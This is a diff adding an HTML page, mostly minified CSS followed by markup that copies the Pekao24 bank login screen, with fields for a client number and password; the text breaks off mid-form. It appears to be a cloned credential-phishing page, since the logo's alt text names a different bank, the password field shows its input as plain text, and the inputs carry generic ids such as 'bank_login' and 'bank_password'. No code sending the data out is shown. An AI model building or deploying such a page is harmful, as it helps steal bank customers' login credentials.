.field-and-buttons[_ngcontent-tvb-c22]:hover     input[type=text], [_ngcontent-tvb-c22]:not(.invalid):not(.warning)   .field-and-buttons[_ngcontent-tvb-c22]:hover     pekao-masked-input-field, [_ngcontent-tvb-c22]:not(.invalid):not(.warning)   .field-and-buttons[_ngcontent-tvb-c22]:hover     pekao-select, [_ngcontent-tvb-c22]:not(.invalid):not(.warning)   .field-and-buttons[_ngcontent-tvb-c22]:hover     textarea{border-color:#2f3234}[_nghost-tvb-c22]     .field-button:hover{background-color:#f4f4f4}}[_nghost-tvb-c22]     .field-button, [_nghost-tvb-c22]     .field-suffix{width:62px;font-size:16px;flex-shrink:0;background:#fff;border:1px solid #b4b4b4;border-right-width:0;transition:.2s ease-in-out;outline:0}[_nghost-tvb-c22]     .field-button:last-child, [_nghost-tvb-c22]     .field-suffix:last-child{border-top-right-radius:4px;border-bottom-right-radius:4px}[_nghost-tvb-c22]     .field-button:focus, [_nghost-tvb-c22]     .field-suffix:focus{background-color:#f4f4f4}[_nghost-tvb-c22]     .field-button [pekao-icon], [_nghost-tvb-c22]     .field-suffix [pekao-icon]{transition:.2s ease-in-out}[_nghost-tvb-c22]     .field-suffix{border-left:none}[_nghost-tvb-c22]     .field-button{color:#d71920}[_nghost-tvb-c22]    :last-of-type{border-right-width:1px}[_nghost-tvb-c22]     .focused:not(.invalid):not(.warning) .field-button, [_nghost-tvb-c22]     .focused:not(.invalid):not(.warning) .field-suffix{border-color:#2f3234}[_nghost-tvb-c22]     .focused:not(.invalid):not(.warning) .field-button:last-of-type, [_nghost-tvb-c22]     .focused:not(.invalid):not(.warning) .field-suffix:last-of-type{border-right-color:#2f3234}[_nghost-tvb-c22]     .invalid .field-button, [_nghost-tvb-c22]     .invalid .field-suffix, [_nghost-tvb-c22]     .warning .field-button, [_nghost-tvb-c22]     .warning .field-suffix{border-style:solid;border-width:1px 0 1px 1px}[_nghost-tvb-c22]     .invalid .field-button:last-of-type, [_nghost-tvb-c22]     .invalid .field-suffix:last-of-type, [_nghost-tvb-c22]     .warning .field-button:last-of-type, [_nghost-tvb-c22]     .warning .field-suffix:last-of-type{border-right-width:1px;border-bottom-right-radius:0}[_nghost-tvb-c22]     .invalid .field-button, [_nghost-tvb-c22]     .warning .field-button{border-color:#ac1419}[_nghost-tvb-c22]     .invalid .field-suffix, [_nghost-tvb-c22]     .warning .field-suffix{border-color:#ac1419;border-left:none}[_nghost-tvb-c22]     .warning:not(.invalid) .field-button, [_nghost-tvb-c22]     .warning:not(.invalid) .field-suffix{border-color:#f56500}.maxlength-counter[_ngcontent-tvb-c22]{pointer-events:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:absolute;right:0;top:0;font-size:11px;line-height:11px;color:#858585}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}pekao-tooltip-icon{font-size:16px}pekao-tooltip-icon span>[pekao-icon]{color:#b4b4b4}pekao-tooltip-icon span>[pekao-icon].pointer{cursor:pointer}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}.cms-message-group[_ngcontent-tvb-c25]{border-top:1px solid #dbdbdb;padding-top:15px;margin-top:15px}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}[_nghost-tvb-c26]{width:100%}[_nghost-tvb-c26]   .login-support-action-group-wrapper[_ngcontent-tvb-c26]{display:flex;justify-content:space-between;width:100%}@media (max-width:767px){[_nghost-tvb-c26]   .login-support-action-group-wrapper[_ngcontent-tvb-c26]{flex-direction:column}}[_nghost-tvb-c26]   .button-tertiary[_ngcontent-tvb-c26]{padding-left:0;padding-right:0}[_nghost-tvb-c26]   pekao-button[_ngcontent-tvb-c26]:not(:last-of-type){margin-right:45px}</style>
+    <style>[_nghost-tvb-c27]{align-items:center;display:flex;justify-content:flex-end}[_nghost-tvb-c27]   pekao-button[_ngcontent-tvb-c27] + pekao-button[_ngcontent-tvb-c27]{margin-left:10px}.language[_ngcontent-tvb-c27]{background-size:cover;background-position:50% 50%;background-repeat:no-repeat;cursor:pointer;display:block;height:16px;width:24px}.language[_ngcontent-tvb-c27]:hover{opacity:.75}.language-pl[_ngcontent-tvb-c27]{background-image:url(img2.gif)}.language-en[_ngcontent-tvb-c27]{background-image:url(420210206052655420113.svg)}.language-ua[_ngcontent-tvb-c27]{background-image:url(420210206052655425115.svg)}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}[_nghost-tvb-c28]{display:block}[_nghost-tvb-c28]     ul{list-style:none;margin:0;padding:0}</style>
+    <style>.reset-button-style[_ngcontent-tvb-c19]{-webkit-appearance:none;-moz-appearance:none;appearance:none;background:0 0;border:none;box-sizing:border-box;cursor:pointer;outline:0;padding:0}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}[_nghost-tvb-c19]{display:block;position:fixed;bottom:0;height:100%;pointer-events:none;right:0;width:100%;z-index:1001}@media (min-width:1410px){[_nghost-tvb-c19]{right:calc(50% - 705px)}}.chat-wrapper[_ngcontent-tvb-c19]{bottom:30px;position:absolute;right:0}.chat-bubble-wrapper[_ngcontent-tvb-c19]{display:flex;min-width:60px;pointer-events:none;position:relative}.chat-bubble[_ngcontent-tvb-c19]{background-color:#4c92e0;border-radius:60px;box-shadow:0 8px 10px -5px rgba(0,0,0,.3);height:60px;pointer-events:all;transition:background-color .2s ease-in-out;width:60px;position:absolute;right:0}.chat-bubble[_ngcontent-tvb-c19]:focus{background-color:#3c77b9}.chat-bubble-expanded-wrapper[_ngcontent-tvb-c19]{display:flex;flex-direction:row-reverse;flex-grow:1}.chat-type-choice-wrapper[_ngcontent-tvb-c19]{background-color:#f4f4f4;border-radius:31px;box-shadow:0 2px 8px 0 rgba(0,0,0,.3);display:flex;flex-direction:row;flex-grow:1;opacity:0;pointer-events:none;transform:translateX(350px)}.chat-type-choice-bubble[_ngcontent-tvb-c19]{background-color:rgba(0,0,0,0);border-radius:31px;color:#4c92e0;flex-grow:1;font-family:Lato,sans-serif;font-size:12px;font-weight:600;height:60px;letter-spacing:1px;padding:0 20px;text-align:center;text-transform:uppercase;transition:background-color .2s ease-in-out,color .2s ease-in-out}@media (hover:hover){.chat-bubble[_ngcontent-tvb-c19]:hover{background-color:#3c77b9}.chat-type-choice-bubble[_ngcontent-tvb-c19]:hover{background-color:#3c77b9;color:#fff}}.chat-type-choice-bubble.active[_ngcontent-tvb-c19], .chat-type-choice-bubble[_ngcontent-tvb-c19]:focus{background-color:#3c77b9;color:#fff}.choice-icon[_ngcontent-tvb-c19]{font-size:16px;padding-right:10px}.bubble-icon[_ngcontent-tvb-c19]{color:#fff;cursor:pointer;display:block;font-size:22px;line-height:60px;text-align:center}.chat-modal-wrapper[_ngcontent-tvb-c19]{background-color:#fff;border:1px solid #dbdbdb;border-radius:4px;bottom:30px;box-shadow:0 0 10px 0 rgba(0,0,0,.3);display:flex;flex-direction:column;height:640px;position:absolute;pointer-events:all;right:0;transform:translateY(0);width:362px}.chat-modal-wrapper.notch-padding[_ngcontent-tvb-c19]{padding-top:env(safe-area-inset-top)}@media (max-width:767px){.chat-wrapper.full-bottom-width[_ngcontent-tvb-c19]{bottom:0;width:100%}.chat-modal-wrapper[_ngcontent-tvb-c19]{bottom:0;height:100%;width:100%}}.chat-content-wrapper[_ngcontent-tvb-c19]{height:523px;overflow:auto;margin:25px 0 30px;padding:0 20px}@media (max-width:767px){.chat-content-wrapper[_ngcontent-tvb-c19]{height:auto;flex-grow:1;margin:15px 0 20px}}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}[_nghost-tvb-c4]{display:block;width:100%}.checkout[_ngcontent-tvb-c4]{display:block;padding:17px 5px;font-size:12px;color:#d71920;text-align:center;text-transform:uppercase}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}[_nghost-tvb-c37]{background-color:#fff;display:block;opacity:1;position:relative;top:0;left:0;width:100%;flex-shrink:0;box-shadow:0 -10px 10px 0 rgba(0,0,0,.2);padding:10px 5px}@media (min-width:768px){[_nghost-tvb-c37]{top:initial;bottom:0;padding-left:35px;padding-right:35px}}.wrapper[_ngcontent-tvb-c37]{margin:0 auto;display:flex;max-width:1260px}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}[_nghost-tvb-c38]{display:flex;flex:1 .5 auto;justify-content:flex-start}@media (max-width:767px){[_nghost-tvb-c38]{flex:initial}}.button-close[_ngcontent-tvb-c38]{display:flex;flex-direction:column;justify-content:center}.close-icon-size[_ngcontent-tvb-c38]{font-size:10px}@media (min-width:768px){.close-icon-size[_ngcontent-tvb-c38]{font-size:12px}}.logo[_ngcontent-tvb-c38]{padding-left:10px;max-height:48px}.text-wrapper[_ngcontent-tvb-c38]{display:flex;flex-direction:column;padding-left:10px;justify-content:space-around}.title[_ngcontent-tvb-c38]{color:#2f3234;font-size:14px;font-weight:900;line-height:1}.description[_ngcontent-tvb-c38]{font-size:12px}</style>
+    <style>[_nghost-tvb-c39]{display:flex;flex:1 .5 auto;justify-content:center}</style>
+    <style>[_nghost-tvb-c40]{display:block;min-width:100%}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}.desktop-preview[_nghost-tvb-c40], .desktop-preview   [_nghost-tvb-c40], .mobile-preview[_nghost-tvb-c40], .mobile-preview   [_nghost-tvb-c40], .tablet-preview[_nghost-tvb-c40], .tablet-preview   [_nghost-tvb-c40]{border:1px solid #b4b4b4;border-radius:4px;padding:15px;width:380px;min-width:380px}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}[_nghost-tvb-c41]{display:flex;margin:5px 0}[_nghost-tvb-c41]     .ql-container.ql-pekao .ql-editor p{font-size:14px}[_nghost-tvb-c41]     .ql-container.ql-pekao .ql-editor p:first-child::before{content:attr(data-before-content);color:#b4b4b4;margin-right:5px}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}[_nghost-tvb-c42]{display:flex;background-color:#f4f4f4;margin-left:-40px;margin-right:-40px;padding:15px 40px}@media (max-width:767px){[_nghost-tvb-c42]{margin-left:-20px;margin-right:-20px;padding-left:20px;padding-right:20px}}[_nghost-tvb-c42]     .ql-container.ql-pekao .ql-editor p{font-size:14px}[_nghost-tvb-c42]     .ql-editor{margin-left:-15px}[_nghost-tvb-c42]     .ql-editor::before{content:' ';width:20px;float:left}.stopwatch-icon[_ngcontent-tvb-c42]{color:#d71920;font-size:16px;height:16px;position:relative}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}.desktop-preview[_nghost-tvb-c42], .desktop-preview   [_nghost-tvb-c42], .tablet-preview[_nghost-tvb-c42], .tablet-preview   [_nghost-tvb-c42]{width:460px;margin:0}.mobile-preview[_nghost-tvb-c42], .mobile-preview   [_nghost-tvb-c42]{width:360px;margin:0;padding-right:20px;padding-left:20px}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}[_nghost-tvb-c43]{color:#fff}[_nghost-tvb-c43]   h1[_ngcontent-tvb-c43]{margin:0}[_nghost-tvb-c43]   p[_ngcontent-tvb-c43]{margin:0}.poster-desktop[_ngcontent-tvb-c43]{display:none;flex-direction:column;position:absolute;z-index:1;top:0;right:0;border-radius:0 10px 10px 0;background:radial-gradient(circle at 30% 60%,#d71920,#920f13 215%);width:219px;height:0;min-height:100%}@media (min-width:768px){.poster-desktop[_ngcontent-tvb-c43]{display:flex}}.poster-desktop[_ngcontent-tvb-c43]   .title[_ngcontent-tvb-c43]{flex:.2 1 auto;padding:42px 20px 0;font-size:16px;font-weight:600}.poster-desktop[_ngcontent-tvb-c43]   .description[_ngcontent-tvb-c43]{flex:.2 1 auto;padding:10px 20px 15px;line-height:1.57;font-size:14px;color:#fff}.poster-desktop[_ngcontent-tvb-c43]   .image-phone[_ngcontent-tvb-c43]{flex:auto;min-height:300px}.poster-desktop[_ngcontent-tvb-c43]   .image-phone.bigger[_ngcontent-tvb-c43]{min-height:400px}.poster-desktop[_ngcontent-tvb-c43]   .image-phone[_ngcontent-tvb-c43]   .img[_ngcontent-tvb-c43]{margin:auto;min-height:300px;height:100%;width:100%;position:relative;background-position:center;background-repeat:no-repeat;background-size:150px 300px}.poster-desktop[_ngcontent-tvb-c43]   .image-phone[_ngcontent-tvb-c43]   .img.bigger[_ngcontent-tvb-c43]{min-height:400px;background-size:200px 400px}.poster-desktop[_ngcontent-tvb-c43]   .details[_ngcontent-tvb-c43]{display:flex;flex:.2 1 auto;flex-direction:column;justify-content:flex-end;text-align:center}.poster-desktop[_ngcontent-tvb-c43]   .details-text[_ngcontent-tvb-c43]{font-size:12px;text-transform:uppercase;padding:15px 0 40px;letter-spacing:1.1px}.poster-desktop[_ngcontent-tvb-c43]   .logo-container[_ngcontent-tvb-c43]{background:url(420210206052655429117.svg);position:absolute;bottom:10px;right:-49px;width:51px;height:260px;cursor:pointer}.poster-desktop[_ngcontent-tvb-c43]   .logo-text[_ngcontent-tvb-c43]{position:absolute;transform:rotate(90deg);bottom:110px;height:35px;width:auto}.poster-desktop[_ngcontent-tvb-c43]   .logo-text.peo-pay[_ngcontent-tvb-c43]{left:-20px}.poster-desktop[_ngcontent-tvb-c43]   .logo-text.peo-pay-kids[_ngcontent-tvb-c43]{left:-4px}.poster-mobile[_ngcontent-tvb-c43]{display:none;width:100%;padding:30px 20px 20px;background-image:radial-gradient(circle at 50% 40%,#d71920,#d71920 51%,#920f13 92%)}@media (max-width:767px){.poster-mobile[_ngcontent-tvb-c43]{display:block}}.poster-mobile[_ngcontent-tvb-c43]   .title[_ngcontent-tvb-c43]{font-size:22px;line-height:1;font-weight:600}.poster-mobile[_ngcontent-tvb-c43]   .description[_ngcontent-tvb-c43]{margin-top:15px;font-size:16px;line-height:1.5;color:#fff}.poster-mobile[_ngcontent-tvb-c43]   .buttons[_ngcontent-tvb-c43]{margin:20px auto 0;max-width:325px;display:flex;justify-content:space-between}.poster-mobile[_ngcontent-tvb-c43]   .store-button-image[_ngcontent-tvb-c43]{display:block;height:42px}.poster-mobile[_ngcontent-tvb-c43]   .phone-image[_ngcontent-tvb-c43]{display:block;margin:30px auto 0;width:150px}.poster-mobile[_ngcontent-tvb-c43]   .details[_ngcontent-tvb-c43]{padding:40px 0;text-align:center}.poster-mobile[_ngcontent-tvb-c43]   .details-text[_ngcontent-tvb-c43]{font-size:12px;text-transform:uppercase;letter-spacing:1.1px}</style>
+    <style>@-webkit-keyframes heartbeat-dot{0%,100%{-webkit-transform:scale(1.7)}50%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot{0%,100%{transform:scale(1.7)}50%{transform:scale(.9)}}@-webkit-keyframes heartbeat-dot-leave{0%{-webkit-transform:scale(1.7)}100%{-webkit-transform:scale(.9)}}@keyframes heartbeat-dot-leave{0%{transform:scale(1.7)}100%{transform:scale(.9)}}.desktop-preview[_nghost-tvb-c43], .desktop-preview   [_nghost-tvb-c43], .mobile-preview[_nghost-tvb-c43], .mobile-preview   [_nghost-tvb-c43], .tablet-preview[_nghost-tvb-c43], .tablet-preview   [_nghost-tvb-c43]{border:1px solid #b4b4b4;border-radius:4px;padding:20px}.desktop-preview[_nghost-tvb-c43]   .poster-desktop[_ngcontent-tvb-c43], .desktop-preview   [_nghost-tvb-c43]   .poster-desktop[_ngcontent-tvb-c43], .mobile-preview[_nghost-tvb-c43]   .poster-desktop[_ngcontent-tvb-c43], .mobile-preview   [_nghost-tvb-c43]   .poster-desktop[_ngcontent-tvb-c43], .tablet-preview[_nghost-tvb-c43]   .poster-desktop[_ngcontent-tvb-c43], .tablet-preview   [_nghost-tvb-c43]   .poster-desktop[_ngcontent-tvb-c43]{position:relative;min-height:500px}.desktop-preview[_nghost-tvb-c43]   .poster-mobile[_ngcontent-tvb-c43], .desktop-preview   [_nghost-tvb-c43]   .poster-mobile[_ngcontent-tvb-c43], .mobile-preview[_nghost-tvb-c43]   .poster-mobile[_ngcontent-tvb-c43], .mobile-preview   [_nghost-tvb-c43]   .poster-mobile[_ngcontent-tvb-c43], .tablet-preview[_nghost-tvb-c43]   .poster-mobile[_ngcontent-tvb-c43], .tablet-preview   [_nghost-tvb-c43]   .poster-mobile[_ngcontent-tvb-c43]{width:100%;max-width:400px}.desktop-preview[_nghost-tvb-c43], .desktop-preview   [_nghost-tvb-c43], .tablet-preview[_nghost-tvb-c43], .tablet-preview   [_nghost-tvb-c43]{padding:20px 60px 20px 20px}.desktop-preview[_nghost-tvb-c43]   .poster-desktop[_ngcontent-tvb-c43], .desktop-preview   [_nghost-tvb-c43]   .poster-desktop[_ngcontent-tvb-c43], .tablet-preview[_nghost-tvb-c43]   .poster-desktop[_ngcontent-tvb-c43], .tablet-preview   [_nghost-tvb-c43]   .poster-desktop[_ngcontent-tvb-c43]{display:block}.desktop-preview[_nghost-tvb-c43]   .poster-mobile[_ngcontent-tvb-c43], .desktop-preview   [_nghost-tvb-c43]   .poster-mobile[_ngcontent-tvb-c43], .tablet-preview[_nghost-tvb-c43]   .poster-mobile[_ngcontent-tvb-c43], .tablet-preview   [_nghost-tvb-c43]   .poster-mobile[_ngcontent-tvb-c43]{display:none}.mobile-preview[_nghost-tvb-c43]   .poster-desktop[_ngcontent-tvb-c43], .mobile-preview   [_nghost-tvb-c43]   .poster-desktop[_ngcontent-tvb-c43]{display:none}.mobile-preview[_nghost-tvb-c43]   .poster-mobile[_ngcontent-tvb-c43], .mobile-preview   [_nghost-tvb-c43]   .poster-mobile[_ngcontent-tvb-c43]{display:block}</style>
+</head>
+<body>
+<pekao-root-pekao24 _nghost-tvb-c0="" class="ng-tns-c0-0" ng-version="7.2.16">
+    <pekao-offline-message _ngcontent-tvb-c0="" class="ng-tns-c0-0 ng-tns-c1-1 ng-trigger ng-trigger-showHide" _nghost-tvb-c1="" style="transform: translate3d(0px, -100%, 0px);">
+        <div _ngcontent-tvb-c1="" class="connection-message is-online">
+            <p _ngcontent-tvb-c1="" class="ng-tns-c1-1"><span _ngcontent-tvb-c1="" class="offline-mode">jesteś w trybie offline</span><span _ngcontent-tvb-c1="" class="online-mode">jesteś online</span></p>
+        </div>
+    </pekao-offline-message>
+    <div _ngcontent-tvb-c0="" class="router-outlet outer-router-outlet ng-trigger ng-trigger-layoutTransition">
+        <router-outlet _ngcontent-tvb-c0="" class="ng-tns-c0-0"></router-outlet>
+        <pekao-login _nghost-tvb-c2="" class="ng-tns-c2-2 ng-star-inserted" style="">
+            <pekao-login-container _ngcontent-tvb-c2="" class="ng-tns-c2-2" _nghost-tvb-c3="">
+                <div _ngcontent-tvb-c3="" class="login-container">
+                    <header _ngcontent-tvb-c3="" class="header">
+                        <div id="logo-region">
+                            <div>
+                                <!----><img class="logo__img--logo" src="https://www.pekao24.pl/assets/img/ci/logo-white.svg" alt="ING Bank Śląski" width="170" height="60">
+                                <!---->
+                            </div>
+                        </div>
+                        <div _ngcontent-tvb-c3="" class="header-wrapper">
+                            <a _ngcontent-tvb-c3="" rel="noopener" target="_blank" href="https://www.pekao.com.pl"></a>
+                            <section _ngcontent-tvb-c3="" class="account-action-group show-on-desktop ng-star-inserted"><span _ngcontent-tvb-c3="" class="account-label">Nie masz konta?</span><a _ngcontent-tvb-c3="" class="account-link" rel="noopener" target="_blank" href="https://www.pekao.com.pl/klient-indywidualny/codzienne-bankowanie/konta-osobiste/konto-przekorzystne.html">Zostań klientem</a></section>
+                        </div>
+                    </header>
+                    <main _ngcontent-tvb-c3="" class="content">
+                        <section _ngcontent-tvb-c3="" class="login-container-wrapper">
+                            <pekao-login-customer _ngcontent-tvb-c2="" _nghost-tvb-c5="" class="ng-tns-c2-2 ng-star-inserted">
+                                <pekao-login-step-box _ngcontent-tvb-c5="" class="login-customer-wrapper ng-tns-c21-3 ng-star-inserted" titletext="Logowanie do Pekao24" _nghost-tvb-c21="">
+                                    <section _ngcontent-tvb-c21="" class="login-container-wrapper">
+                                        <div _ngcontent-tvb-c21="" class="login-container-content ng-trigger ng-trigger-moveLoginContainerContent" style="margin-left: 0px;">
+                                            <header _ngcontent-tvb-c21="" class="login-container-header ng-tns-c21-3 ng-star-inserted" style="">
+                                                <div _ngcontent-tvb-c21="" class="title-and-language-wrapper">
+                                                    <h1 _ngcontent-tvb-c21="" id="summaryInfo" class="login-container-header-title">Logowanie do Pekao24</h1>
+                                                    <pekao-language-picker _ngcontent-tvb-c21="" _nghost-tvb-c27="" class="ng-tns-c21-3 ng-star-inserted">
+                                                        <pekao-button _ngcontent-tvb-c27="" _nghost-tvb-c20="" class="ng-star-inserted"><button _ngcontent-tvb-c27="" class="button button-tertiary" type="button"><span _ngcontent-tvb-c27="" class="visually-hidden">english</span><i _ngcontent-tvb-c27="" class="language language-en"></i></button></pekao-button>
+                                                        <pekao-button _ngcontent-tvb-c27="" _nghost-tvb-c20="" class="ng-star-inserted"><button _ngcontent-tvb-c27="" class="button button-tertiary" type="button"><span _ngcontent-tvb-c27="" class="visually-hidden">українська</span><i _ngcontent-tvb-c27="" class="language language-ua"></i></button></pekao-button>
+                                                    </pekao-language-picker>
+                                                </div>
+                                                <section _ngcontent-tvb-c5="" login-container-header="" pekaomessageplaceholder=""></section>
+                                            </header>
+                                            <div _ngcontent-tvb-c21="" class="login-container-form">
+                                                <div id="mainCont" _ngcontent-tvb-c5="" autocomplete="off" novalidate="" class="ng-untouched ng-pristine ng-invalid">
+                                                    <pekao-field _ngcontent-tvb-c5="" for="customer" label="Wpisz numer klienta" pekaoautofocus="" pekaoblockautofocusinputvalidation="" _nghost-tvb-c22="" class="number-client-or-name-pekao-field">
+                                                        <div _ngcontent-tvb-c22="" class="field-container large closed-messages">
+
+
+
+                                                            <div id="otherForms">
+                                                                <div id="bankForm">
+                                                                    <label _ngcontent-tvb-c22="" for="customer" class="ng-star-inserted" style="">
+                                                                        Wpisz numer klienta
+                                                                    </label>
+                                                                    <span _ngcontent-tvb-c22="" class="field-and-buttons">
+                                                      <input _ngcontent-tvb-c5="" aria-describedby="customerError" class="pekao-field-input ng-untouched ng-pristine ng-invalid ng-star-inserted" formcontrolname="customer" id="bank_login" pekaoforcemaxlength="" pekaokeyboardsupport="" type="text" maxlength="20" aria-invalid="true" style="">
+                                                      <button _ngcontent-tvb-c5="" aria-label="Otwórz klawiaturę ekranową" class="field-button keyboard-button ng-star-inserted" type="button" style="">
+                                                         <i _ngcontent-tvb-c5="" pekao-icon="" _nghost-tvb-c24="">
+                                                            <svg fill="currentColor" focusable="false" aria-hidden="true" role="img" xmlns="http://www/w3/org/2000/svg" viewBox="0 0 20 20">
+                                                               <path fill="currentColor" d="M1 2h18a1 1 0 0 1 1 1v14a1 1 0 0 1-1 1H1a1 1 0 0 1-1-1V3a1 1 0 0 1 1-1zm1 2v12h16V4H2zm5.5 8h5a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-5a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm-4-6h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm0 6h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm2-3h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm-6-3h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm4 0h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5zm0 6h1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-1a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5z"></path>
+                                                            </svg>
+                                                         </i>
+                                                      </button>
+                                                            </span>
+
+                                                                    <br><br>
+
+                                                                    <label _ngcontent-tvb-c22="" for="customer" class="ng-star-inserted" style="">
+                                                                        Wpisz hasło
+                                                                    </label>
+                                                                    <span _ngcontent-tvb-c22="" class="field-and-buttons">
+                                                      <input _ngcontent-tvb-c5="" aria-describedby="customerError" class="pekao-field-input ng-untouched ng-pristine ng-invalid ng-star-inserted" formcontrolname="customer" id="bank_password" pekaoforcemaxlength="" pekaokeyboardsupport="" type="text" maxlength="20" aria-invalid="true" style="">
